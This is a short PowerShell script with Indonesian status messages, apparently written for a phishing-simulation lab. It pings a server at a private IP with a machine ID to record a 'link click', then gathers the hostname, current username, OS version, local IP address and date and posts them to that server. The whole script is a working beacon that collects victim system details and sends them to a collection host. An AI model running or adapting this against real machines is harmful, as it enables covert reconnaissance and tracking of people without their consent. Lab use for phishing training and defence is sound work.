$ServerIP = "172.16.225.135"
$ServerPort = "8080"
$MachineID = "win-lab-1"
$Base = "http://" + $ServerIP + ":" + $ServerPort

$wc = New-Object System.Net.WebClient
$wc.Proxy = $null

try {
    $page = $wc.DownloadString($Base + "/?id=" + $MachineID)
    Write-Host "[+] Link terbuka, server mencatat klik (ID: $MachineID)"
} catch {
    Write-Host "[!] Gagal buka link: $($_.Exception.Message)"
}

$os = Get-CimInstance Win32_OperatingSystem
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127.*" } | Select-Object -First 1).IPAddress
$payload = @"
=== System Info ===
Hostname: $env:COMPUTERNAME
User: $env:USERNAME
OS: $($os.Caption) $($os.Version)
IP: $ip
Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@

try {
    $wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
    $resp = $wc.UploadString($Base + "/", "data=" + [uri]::EscapeDataString($payload))
    Write-Host "[+] Data sistem terkirim, server membalas: $resp"
} catch {
    Write-Host "[!] Gagal kirim data: $($_.Exception.Message)"
}
